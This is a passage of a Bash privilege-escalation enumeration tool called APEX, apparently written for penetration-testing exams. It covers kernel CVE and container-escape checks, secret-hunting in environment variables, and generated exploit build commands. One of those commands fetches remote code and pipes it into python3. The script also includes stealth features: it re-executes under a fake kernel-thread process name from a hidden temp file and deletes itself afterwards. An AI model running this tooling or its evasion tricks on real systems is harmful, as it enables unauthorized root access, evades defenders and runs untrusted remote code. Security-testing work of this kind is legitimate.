    #   2. If origin + exec_dir available AND no BG pspy → tool_orchestrator
    #      runs the on-demand pspy + linpeas + lse fetch.
    #   3. The pspy-free alt scan ALWAYS runs and produces findings even when
    #      every download path fails.

    apex_detect_origin
    apex_find_exec_dir

    # Path A: bg pspy already running — let it finish via apex_pspy_bg_wait.
    # Path B: orchestrator can fetch tools — run it.
    # Path C: nothing — try local pspy binary.
    # In ALL paths, run the alt scan in parallel for atime/proc-diff coverage.
    if [ -z "$APEX_PSPY_BG_PID" ]; then
        if [ -n "$APEX_ORIGIN_BASE" ] && [ -n "$APEX_EXEC_DIR" ]; then
            tool_orchestrator &
            local _orch_pid=$!
        else
            local pspy_bin="" cand
            for cand in \
                "${APEX_DIR:-}/bin/pspy64" "${APEX_DIR:-}/bin/pspy32" \
                /usr/local/bin/pspy64 /usr/local/bin/pspy32 /usr/local/bin/pspy \
                /home/kali/privesc-toolkit/linux/pspy64 \
                /home/kali/privesc-toolkit/linux/pspy64s \
                /home/kali/privesc-toolkit/linux/pspy32
            do
                [ -n "$cand" ] && [ -x "$cand" ] && { pspy_bin="$cand"; break; }
            done
            [ -z "$pspy_bin" ] && cand=$(command -v pspy 2>/dev/null) && pspy_bin="$cand"
            if [ -n "$pspy_bin" ]; then
                local pspy_tmp="$APEX_TMP/pspy_local_$$"
                ( safe_run 65 "$pspy_bin" -p 2>/dev/null | head -2000 > "$pspy_tmp"
                  [ -s "$pspy_tmp" ] && pspy_smart_parser "$pspy_tmp"
                  rm -f "$pspy_tmp" ) &
            fi
        fi
    fi

    # ALWAYS run the pspy-free alt scan. 60s window is long enough to catch
    # the per-minute cron tick; this is the signal that revealed the original
    # bank_backupd PATH-hijack chain.
    apex_dynamic_alt_scan 60

    # Reap orchestrator if it was started.
    [ -n "${_orch_pid:-}" ] && wait "$_orch_pid" 2>/dev/null
    wait 2>/dev/null

    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 6 "Dynamic" 7 "Kernel CVE" "$_n"
    return 0
}

_kernel_in_range() {
    # Args: kernel_string  low_inclusive  high_exclusive
    # Returns 0 if  low <= kernel < high.  Uses sort -V.
    local k="${1:-}" lo="$2" hi="$3"
    [ -z "$k" ] && return 1
    # Strip any -arch suffix
    k=$(printf '%s' "$k" | awk -F- '{print $1}')
    local first
    first=$(printf '%s\n%s\n' "$lo" "$k" | sort -V | head -1)
    [ "$first" = "$lo" ] || return 1
    first=$(printf '%s\n%s\n' "$k" "$hi" | sort -V | head -1)
    [ "$first" = "$k" ] && [ "$k" != "$hi" ] || return 1
    return 0
}

_check_prereq() {
    # Pipe-free prerequisite checks for CVE exploitability.
    # Returns 0 (true) if prereq met, 1 if not.
    # Usage: _check_prereq <prereq_name>
    local prereq="${1:-}"
    case "$prereq" in
        userns)
            # Unprivileged user namespaces enabled
            [ "$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)" = "1" ] && return 0
            # On systems without this knob, check if unshare works
            unshare -U true 2>/dev/null && return 0
            return 1
            ;;
        nftables)
            [ -d /sys/module/nf_tables ] && return 0
            return 1
            ;;
        esp4)
            [ -d /sys/module/esp4 ] && return 0
            return 1
            ;;
        overlayfs)
            [ -d /sys/module/overlay ] && return 0
            return 1
            ;;
        glibc_2_34_plus)
            # DirtyFrag and Fragnesia require glibc >= 2.34
            local gv
            gv=$(getconf GNU_LIBC_VERSION 2>/dev/null | awk '{print $2}')
            if [ -n "$gv" ]; then
                local gmaj gmin
                gmaj="${gv%%.*}"
                gmin="${gv#*.}"
                gmin="${gmin%%.*}"
                if [ "$gmaj" -gt 2 ] 2>/dev/null; then return 0; fi
                if [ "$gmaj" -eq 2 ] && [ "$gmin" -ge 34 ] 2>/dev/null; then return 0; fi
            fi
            return 1
            ;;
        *)
            return 0  # unknown prereq = assume met
            ;;
    esac
}

kernel_lpe_suggest() {
    # D12: Print manual LPE suggestions for each matching CVE.
    # OSCP-compliant: print commands only, NEVER auto-execute.
    # Format: CVE|name|min_kernel|max_kernel|poc_url|poc_type
    local k="${1:-${KERNEL:-}}"
    [ -z "$k" ] && return 0

    # CVE table — 6 fields, no embedded pipes
    local CVE_TABLE
    CVE_TABLE="CVE-2026-46300|Fragnesia|4.9|6.18|https://github.com/v12-security/pocs|c_subdir:fragnesia
CVE-2026-43284|DirtyFrag|4.9|6.18|https://github.com/V4bel/dirtyfrag|c
CVE-2026-31431|CopyFail|4.9|6.18|https://copy.fail/exp|py_pipe
CVE-2024-1086|nftables-UAF|5.14|6.6|https://github.com/Notselwyn/CVE-2024-1086|go
CVE-2023-4911|LooneyTunables|2.6.32|6.6|https://github.com/leesh3288/CVE-2023-4911|c
CVE-2023-2640|GameOverlay|5.4|6.2|https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629|oneliner
CVE-2023-0386|OverlayFS-SUID|5.11|6.1|https://github.com/xkaneiki/CVE-2023-0386|c
CVE-2022-0847|DirtyPipe|5.8|5.16|https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits|c"

    printf '%s\n' "$CVE_TABLE" | while IFS='|' read -r cve name min_k max_k poc_url poc_type; do
        [ -z "$cve" ] && continue
        _kernel_in_range "$k" "$min_k" "$max_k" || continue

        # Prereq check per CVE
        local prereq_ok=0
        case "$cve" in
            CVE-2026-46300|CVE-2026-43284) _check_prereq glibc_2_34_plus && prereq_ok=1 ;;
            CVE-2024-1086) _check_prereq nftables && prereq_ok=1 ;;
            CVE-2023-0386) _check_prereq overlayfs && _check_prereq userns && prereq_ok=1 ;;
            CVE-2023-2640) _check_prereq overlayfs && prereq_ok=1 ;;
            *) prereq_ok=1 ;;
        esac

        local conf=75
        [ "$prereq_ok" -eq 1 ] && conf=85

        local build_cmd=""
        case "$poc_type" in
            c)       build_cmd="git clone $poc_url; cd \$(basename $poc_url); make; ./exploit" ;;
            c_subdir:*)
                local subdir="${poc_type#c_subdir:}"
                build_cmd="git clone $poc_url; cd \$(basename $poc_url)/$subdir; make; ./exploit"
                ;;
            go)      build_cmd="git clone $poc_url; cd \$(basename $poc_url); go build .; ./\$(basename $poc_url)" ;;
            py_pipe) build_cmd="curl -fL $poc_url | python3" ;;
            oneliner) build_cmd="# See README at $poc_url for one-liner" ;;
            *)       build_cmd="# Download from $poc_url" ;;
        esac

        # Use CVE-specific type so _get_stored_exploit matches correctly
        local safe_cve
        safe_cve=$(printf '%s' "$cve" | tr '.-' '__')
        register_finding "KERNEL_LPE_$safe_cve" "$k" \
            "$cve ($name) candidate — kernel $k in range $min_k-$max_k | prereq_met=$prereq_ok | PoC: $poc_url" \
            "$conf" "kernel_lpe"
        register_exploit "KERNEL_LPE_$safe_cve" "$k" \
            "$build_cmd"
    done
}

layer_7_kernel_cve() {
    # Static table of well-known CVEs. Real-world exploitability needs manual
    # verification — these are CANDIDATES at the version-range level.
    local _s _n
    _s=$(_finding_count)
    if _layer_should_skip; then
        print_layer_status 7 "Kernel CVE" "SKIPPED" 0
        return 0
    fi

    local k="${KERNEL:-}"
    if [ -z "$k" ]; then
        _layer_wrap_end 7 "Kernel CVE" 8 "Container" 0
        return 0
    fi

    if _kernel_in_range "$k" "2.6.22" "4.8.3"; then
        register_finding "KERNEL_CVE" "$k" \
            "CVE-2016-5195 DirtyCow candidate (search: dirtycow PoC C source)" 85 "kernel"
    fi
    if _kernel_in_range "$k" "5.8" "5.16.11"; then
        register_finding "KERNEL_CVE" "$k" \
            "CVE-2022-0847 DirtyPipe candidate (search: dirty pipe PoC)" 90 "kernel"
    fi
    if _kernel_in_range "$k" "5.11" "5.13"; then
        register_finding "KERNEL_CVE" "$k" \
            "CVE-2021-3493 OverlayFS namespace candidate" 80 "kernel"
    fi
    if _kernel_in_range "$k" "5.4" "6.2"; then
        register_finding "KERNEL_CVE" "$k" \
            "CVE-2023-32233 nftables UAF candidate" 75 "kernel"
    fi

    # PwnKit: pkexec exists and looks old. We don't have version parsing, so
    # report as candidate when pkexec is suid and present.
    if [ -u /usr/bin/pkexec ]; then
        local pv
        pv=$(safe_run 3 /usr/bin/pkexec --version 2>/dev/null | awk '{print $NF}')
        case "$pv" in
            ''|0.105|0.106|0.107|0.108|0.109|0.110|0.111|0.112|0.113|0.114|0.115|0.116|0.117|0.118|0.119)
                register_finding "KERNEL_CVE" "/usr/bin/pkexec" \
                    "CVE-2021-4034 PwnKit candidate (pkexec ${pv:-unknown})" 88 "kernel"
                ;;
        esac
    fi

    # Always suggest kernel LPE CVEs — kernel version is independent of other findings.
    # A machine with many SUID paths may still be vulnerable to kernel exploits.
    kernel_lpe_suggest "$k"

    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 7 "Kernel CVE" 8 "Container" "$_n"
    return 0
}

layer_8_container() {
    local _s _n
    _s=$(_finding_count)
    case "${IS_CONTAINER:-0}" in
        1|yes|true) ;;
        *)
            print_layer_status 8 "Container Escape" "SKIPPED" 0
            return 0
            ;;
    esac

    # docker.sock writable
    local s
    for s in /var/run/docker.sock /run/docker.sock; do
        [ -e "$s" ] || continue
        if verify_actually_writable "$s" 2>/dev/null; then
            register_finding "CONTAINER_DOCKER_SOCK" "$s" \
                "docker.sock writable inside container — instant host root" 95 "container"
        fi
    done

    # Capability bitmask parse — bit 21 = CAP_SYS_ADMIN, bit 19 = CAP_SYS_PTRACE
    local capeff
    capeff=$(safe_run 2 sh -c 'awk "/^CapEff:/{print \$2}" /proc/self/status' 2>/dev/null)
    if [ -n "$capeff" ]; then
        local cap_dec
        cap_dec=$(printf '%d' "0x${capeff}" 2>/dev/null)
        if [ -n "$cap_dec" ]; then
            if [ "$(( cap_dec & (1 << 21) ))" -ne 0 ]; then
                register_finding "CONTAINER_CAP_SYS_ADMIN" "/proc/self/status" \
                    "CAP_SYS_ADMIN present — mount host fs, ptrace, many escapes" 95 "container"
            fi
            if [ "$(( cap_dec & (1 << 19) ))" -ne 0 ]; then
                register_finding "CONTAINER_CAP_SYS_PTRACE" "/proc/self/status" \
                    "CAP_SYS_PTRACE present — attach to host processes if PID namespace shared" 85 "container"
            fi
            if [ "$(( cap_dec & (1 << 7) ))" -ne 0 ]; then
                register_finding "CONTAINER_CAP_SETUID" "/proc/self/status" \
                    "CAP_SETUID present — combined with other caps may escape" 65 "container"
            fi
        fi
    fi

    # /proc/sysrq-trigger writable
    if [ -w /proc/sysrq-trigger ]; then
        register_finding "CONTAINER_SYSRQ_WRITABLE" "/proc/sysrq-trigger" \
            "/proc/sysrq-trigger writable — host kernel control" 90 "container"
    fi

    # Seccomp check
    local seccomp
    seccomp=$(safe_run 2 sh -c 'awk "/^Seccomp:/{print \$2}" /proc/self/status' 2>/dev/null)
    if [ "$seccomp" = "0" ] && [ -f /.dockerenv ]; then
        register_finding "CONTAINER_NO_SECCOMP" "/.dockerenv" \
            "Docker container with Seccomp=0 — full syscall surface" 70 "container"
    fi

    # cgroup v1 release_agent
    if [ -d /sys/fs/cgroup ]; then
        local ra
        for ra in /sys/fs/cgroup/*/release_agent /sys/fs/cgroup/release_agent; do
            [ -e "$ra" ] || continue
            if [ -w "$ra" ]; then
                register_finding "CONTAINER_RELEASE_AGENT" "$ra" \
                    "cgroup v1 release_agent writable — classic host-root escape" 92 "container"
            fi
        done
    fi

    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 8 "Container Escape" 9 "MAC" "$_n"
    return 0
}

layer_9_mac() {
    local _s _n
    _s=$(_finding_count)
    if _layer_should_skip; then
        print_layer_status 9 "MAC" "SKIPPED" 0
        return 0
    fi

    local has_aa=0 has_se=0

    # AppArmor
    if command -v aa-status >/dev/null 2>&1; then
        has_aa=1
        local aa_out
        aa_out=$(safe_run 5 aa-status 2>/dev/null)
        local enforce_count
        enforce_count=$(printf '%s\n' "$aa_out" | grep -cE 'profiles? are in enforce mode')
        register_finding "MAC_APPARMOR_ACTIVE" "aa-status" \
            "AppArmor active — $(printf '%s' "$aa_out" | head -3 | tr '\n' ' ')" 25 "mac"
    fi
    if [ -d /etc/apparmor.d ]; then
        has_aa=1
        local p
        for p in /etc/apparmor.d/*; do
            [ -f "$p" ] || continue
            if verify_actually_writable "$p" 2>/dev/null; then
                register_finding "MAC_APPARMOR_PROFILE_WRITABLE" "$p" \
                    "AppArmor profile file writable — can disable MAC for protected binaries" 85 "mac"
            fi
        done
    fi

    # SELinux
    if command -v getenforce >/dev/null 2>&1; then
        has_se=1
        local mode
        mode=$(safe_run 2 getenforce 2>/dev/null)
        case "$mode" in
            Permissive)
                register_finding "MAC_SELINUX_PERMISSIVE" "getenforce" \
                    "SELinux in Permissive mode — denies are logged but not enforced" 60 "mac"
                ;;
            Disabled)
                : # treated below by MAC_DISABLED case
                ;;
        esac
    fi
    if [ -d /etc/selinux ]; then
        has_se=1
        local sp
        for sp in /etc/selinux/*/policy/*; do
            [ -f "$sp" ] || continue
            if verify_actually_writable "$sp" 2>/dev/null; then
                register_finding "MAC_SELINUX_POLICY_WRITABLE" "$sp" \
                    "SELinux policy binary writable" 88 "mac"
            fi
        done
    fi

    if [ "$has_aa" -eq 0 ] && [ "$has_se" -eq 0 ]; then
        register_finding "MAC_DISABLED" "system" \
            "No MAC framework detected — no AppArmor, no SELinux" 30 "mac"
    fi

    _n=$(( $(_finding_count) - _s ))
    _layer_wrap_end 9 "MAC" 10 "Manual" "$_n"
    return 0
}

layer_10_manual() {
    # Always runs. Gathers manual surface and reports — not used by reasoner.
    local _s _n
    _s=$(_finding_count)

    # Listening sockets
    local listeners=""
    if command -v ss >/dev/null 2>&1; then
        listeners=$(safe_run 5 ss -tlnH 2>/dev/null | awk '{print $4}' | sort -u | head -10)
    elif command -v netstat >/dev/null 2>&1; then
        listeners=$(safe_run 5 netstat -tln 2>/dev/null | awk '/^tcp/{print $4}' | sort -u | head -10)
    fi
    if [ -n "$listeners" ]; then
        printf '%s\n' "$listeners" | while IFS= read -r addr; do
            [ -z "$addr" ] && continue
            case "$addr" in
                *:22|*:80|*:443|*:53) continue ;;
            esac
            register_finding "MANUAL_LISTENING" "$addr" \
                "Non-standard listening socket — investigate service" 40 "manual"
        done
    fi

    # Web/admin apps
    local web_procs
    web_procs=$(safe_run 3 ps -eo cmd 2>/dev/null | grep -E '\b(nginx|apache2?|httpd|tomcat|node|python.*http|ruby|gunicorn|uwsgi)\b' | grep -v grep | head -5)
    if [ -n "$web_procs" ]; then
        printf '%s\n' "$web_procs" | while IFS= read -r pr; do
            register_finding "MANUAL_WEB_APP" "process" \
                "Web/admin process: $(printf '%s' "$pr" | cut -c1-100)" 35 "manual"
        done
    fi

    # Recent auth failures (if readable)
    if [ -r /var/log/auth.log ]; then
        local af
        af=$(safe_run 3 tail -n 100 /var/log/auth.log 2>/dev/null | grep -c 'Failed password')
        if [ -n "$af" ] && [ "$af" -gt 5 ]; then
            register_finding "MANUAL_AUTH_FAILURES" "/var/log/auth.log" \
                "$af failed-password attempts in last 100 lines — brute force or pivot opportunity" 35 "manual"
        fi
    fi

    # Interesting env vars in our shell
    local secrets
    secrets=$(env 2>/dev/null | grep -iE '(pass|token|key|secret|api)' | head -5)
    if [ -n "$secrets" ]; then
        printf '%s\n' "$secrets" | while IFS= read -r ev; do
            register_finding "MANUAL_ENV_SECRET" "shell_env" \
                "Secret-like env var: $(printf '%s' "$ev" | head -c 80)" 50 "manual"
        done
    fi

    # Writable PATH dirs
    local IFS_save="$IFS"
    IFS=':'
    # shellcheck disable=SC2086
    set -- $PATH
    IFS="$IFS_save"
    local pd
    for pd in "$@"; do
        [ -z "$pd" ] && continue
        [ -d "$pd" ] || continue
        if verify_actually_writable "$pd" 2>/dev/null; then
            register_finding "MANUAL_PATH_WRITABLE" "$pd" \
                "Writable directory in current PATH — plant binary to hijack future calls" 75 "manual"
        fi
    done

    _n=$(( $(_finding_count) - _s ))
    print_layer_status 10 "Manual Investigation" "COMPLETE" "$_n"
    return 0
}


# =============================================================================
# SECTION 10 — Trap / Signal Handlers
# =============================================================================
# Cleanup runs on EXIT, INT, TERM. Removes APEX_TMP and any tracked tempfiles.
# Registered in main() AFTER setup_apex_tmp() so the trap has something to clean.

# Run cleanup on natural exit. Preserves the script's exit code.
trap_exit() {
    cleanup_apex
    return 0
}

# SIGINT (Ctrl-C). Standard exit code 130 (128 + 2).
trap_interrupt() {
    cleanup_apex
    exit 130
}

# SIGTERM. Standard exit code 143 (128 + 15).
trap_terminate() {
    cleanup_apex
    exit 143
}

# Install all three. Single quotes so $? evaluation happens at trap-fire time,
# not at install time.
install_traps() {
    trap 'trap_exit' EXIT
    trap 'trap_interrupt' INT
    trap 'trap_terminate' TERM
    return 0
}


# =============================================================================
# SECTION 11 — Self-Test Harness
# =============================================================================
# bash apex.sh --test runs internal unit tests. Each phase adds tests. Phase 0
# has only the scaffold-loadability test (this very run).

# Phase 1 gate: safe_run 2 sleep 60 must return in 2 seconds, not 60.
test_safe_run() {
    local start end elapsed out
    start=$(date +%s)
    out=$(safe_run 2 sleep 60)
    end=$(date +%s)
    elapsed=$((end - start))

    if [ "$elapsed" -le 4 ]; then
        printf 'TEST PASSED: safe_run timeout (elapsed=%ds, target<=4s, out=[%s])\n' \
            "$elapsed" "$out"
        return 0
    fi
    printf 'TEST FAILED: safe_run timeout (elapsed=%ds, expected <=4s)\n' "$elapsed"
    return 1
}

# Phase 1 gate: apex_find must exclude /proc and return real entries.
test_apex_find() {
    local proc_hits etc_hits
    proc_hits=$(apex_find / -maxdepth 2 -path '/proc*' 2>/dev/null | wc -l)
    etc_hits=$(apex_find /etc -maxdepth 1 -name 'passwd' 2>/dev/null | wc -l)

    if [ "${proc_hits:-1}" -eq 0 ] && [ "${etc_hits:-0}" -ge 1 ]; then
        printf 'TEST PASSED: apex_find (proc_hits=%d etc_hits=%d)\n' "$proc_hits" "$etc_hits"
        return 0
    fi
    printf 'TEST FAILED: apex_find (proc_hits=%d etc_hits=%d)\n' "$proc_hits" "$etc_hits"
    return 1
}

# Phase 1 gate: verify_actually_writable accepts a fresh tmpfile, rejects
# /etc/shadow, rejects a nonexistent path.
test_verify_writable() {
    local tmp tmpf
    tmp=$(mktemp -d 2>/dev/null) || return 1
    tmpf="${tmp}/probe"
    : >"$tmpf"

    local ok=0 bad=0
    verify_actually_writable "$tmpf"        && ok=$((ok + 1))   || bad=$((bad + 1))
    verify_actually_writable "$tmp"         && ok=$((ok + 1))   || bad=$((bad + 1))
    verify_actually_writable /etc/shadow    && bad=$((bad + 1)) || ok=$((ok + 1))
    verify_actually_writable /nonexistent   && bad=$((bad + 1)) || ok=$((ok + 1))

    rm -rf -- "$tmp" 2>/dev/null

    if [ "$ok" -eq 4 ] && [ "$bad" -eq 0 ]; then
        printf 'TEST PASSED: verify_actually_writable (4/4 cases)\n'
        return 0
    fi
    printf 'TEST FAILED: verify_actually_writable (ok=%d bad=%d)\n' "$ok" "$bad"
    return 1
}

# Stub — implemented in Phase 5 (Engine 3).
test_register_finding() { return 0; }

# Self-test driver. Runs every test_*() and aggregates pass/fail.
run_self_test() {
    local total=0 passed=0
    local t
    for t in test_safe_run test_apex_find test_verify_writable test_register_finding; do
        total=$((total + 1))
        if "$t"; then
            passed=$((passed + 1))
        fi
    done
    printf '=========================\n'
    printf 'SELF-TEST: %d/%d passed\n' "$passed" "$total"
    [ "$passed" -eq "$total" ]
    return $?
}


# =============================================================================
# SECTION 12 — Argument Parsing and Usage
# =============================================================================

usage() {
    printf '%s\n' "APEX v${APEX_VERSION} — Linux PrivEsc reasoner"
    printf '%s\n' "Usage: bash apex.sh [--test] [--quick] [--verbose] [--debug] [--no-color]"
    return 0
}

APEX_SELF_DELETE=0
APEX_MASK_PROC=0

parse_args() {
    # Minimal Phase 1 parsing — enough to support --test gate runs.
    # Full CLI handling (mode flags, layer limits, output toggles) lands later.
    while [ "$#" -gt 0 ]; do
        case "$1" in
            --test)        APEX_MODE="test" ;;
            --quick)       APEX_MODE="quick" ;;
            --full)        APEX_MODE="full" ;;
            --normal)      APEX_MODE="normal" ;;
            --verbose|-v)  APEX_VERBOSE=1 ;;
            --debug)       APEX_DEBUG=1 ;;
            --no-color)    APEX_NO_COLOR=1 ;;
            --self-delete) APEX_SELF_DELETE=1 ;;
            --stealth)     APEX_SELF_DELETE=1; APEX_MASK_PROC=1 ;;
            --help|-h)     usage; exit 0 ;;
            *)             ;;  # ignore unknown args in Phase 1
        esac
        shift
    done
    return 0
}

_apex_mask_process() {
    # Re-exec with an innocuous process name visible in ps/top.
    # Only runs once (checks for APEX_MASKED env var to prevent loop).
    [ "${APEX_MASKED:-0}" = "1" ] && return 0
    [ "$APEX_MASK_PROC" = "1" ] || return 0
    # Copy self to a hidden temp file with a neutral name, then exec into it.
    local _self _masked
    _self=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || printf '%s' "$0")
    # Pick a writable exec dir (same logic as apex_find_exec_dir but simpler here)
    local _exec_dir=""
    for _d in /dev/shm /run/user/$(id -u 2>/dev/null) /tmp; do
        [ -d "$_d" ] && [ -w "$_d" ] || continue
        # Quick noexec probe
        local _pt="$_d/.apex_nx_$$"
        printf '#!/bin/sh\nexit 0\n' > "$_pt" 2>/dev/null && chmod +x "$_pt" 2>/dev/null
        if "$_pt" 2>/dev/null; then rm -f "$_pt"; _exec_dir="$_d"; break; fi
        rm -f "$_pt" 2>/dev/null
    done
    [ -z "$_exec_dir" ] && return 0
    _masked="$_exec_dir/.$(tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c 8 || printf '%s' "$$random").sh"
    cp "$_self" "$_masked" 2>/dev/null || return 0
    chmod +x "$_masked" 2>/dev/null
    # Pass all original args plus APEX_MASKED=1 to prevent re-entry
    export APEX_MASKED=1
    # exec -a renames argv[0] in ps output
    exec -a "[kworker/u$(nproc 2>/dev/null || printf 2):0-events]" bash "$_masked" "$@"
}


# =============================================================================
# MAIN — Orchestration Order
# =============================================================================
# Order matters. Pre-flight must run before any engine (engines read pre-flight
# globals). Output layer must be initialized before any print_* call. Traps
# must be installed AFTER setup_apex_tmp so cleanup has something to clean.

main() {
    parse_args "$@"

    # GAP-15: process name masking — re-exec under innocent name before doing anything visible
    _apex_mask_process "$@"

    # Record start so print_summary can compute wall-clock runtime.
    APEX_START_TIME=$(date +%s 2>/dev/null)
    : "${APEX_START_TIME:=0}"

    # ── Pre-flight ──────────────────────────────────────────────────────────
    detect_bash_features
    detect_environment
    detect_security_layers
    detect_container
    detect_resources
    detect_execution_primitives
    detect_restricted_shell

    # ── Working state ───────────────────────────────────────────────────────
    setup_apex_tmp
    install_traps

    # ── Banner ──────────────────────────────────────────────────────────────
    apex_render_detect_mode
    print_banner
    print_header

    # ── Self-test short-circuit ─────────────────────────────────────────────
    if [ "$APEX_MODE" = "test" ]; then
        run_self_test
        return 0
    fi

    # Arsenal + CVE PoC staging — runs BEFORE pspy bg start so that staged
    # tools are available to the orchestrator and so the SAVED block prints
    # near the top of the operator's terminal. Both calls no-op silently when
    # no origin is reachable.
    apex_detect_origin
    apex_find_exec_dir
    if [ -n "$APEX_ORIGIN_BASE" ] && [ -n "$APEX_EXEC_DIR" ]; then
        apex_stage_arsenal
        apex_stage_cve
    fi

    # GAP 2: kick pspy off in background BEFORE any static layer runs. It
    # collects for ~70s in parallel with all static analysis. After layer 10
    # we wait + parse the captured trace. Layer 6 detects this and skips its
    # own duplicate pspy execution.
    apex_pspy_bg_start

    # ── Layer execution (1..10, adaptive) ───────────────────────────────────
    layer_1_dac
    layer_2_deep_read
    layer_3_credentials
    layer_4_integrity
    layer_5_timeline
    layer_6_dynamic
    layer_7_kernel_cve
    layer_8_container
    layer_9_mac
    layer_10_manual

    # GAP 2: collect + parse the early pspy capture started before layer 1.
    apex_pspy_bg_wait_and_parse

    # ── Reasoner + output ───────────────────────────────────────────────────
    build_confirmed_chains >/dev/null
    correlate_lateral_pivots
    print_confirmed_path
    print_tool_oneliners
    print_summary
    print_final_watch_actions
    print_pivot_prompt
    cleanup_apex

    # GAP-14: self-delete after all output is flushed
    if [ "$APEX_SELF_DELETE" = "1" ]; then
        local _self
        _self=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || printf '%s' "$0")
        if [ -f "$_self" ]; then
            rm -f "$_self" 2>/dev/null
            printf '[*] Self-deleted: %s\n' "$_self" >&2
        fi
    fi

    return 0
}

# Entry point ────────────────────────────────────────────────────────────────
# Only run main if the script was executed (not sourced). This lets unit tests
# `source apex.sh` to import functions without triggering the full pipeline.
if [ "${BASH_SOURCE[0]:-$0}" = "$0" ]; then
    main "$@"
    [ "${APEX_MODE:-normal}" = "test" ] && printf '%s\n' "APEX scaffold ready"
    exit 0
fi
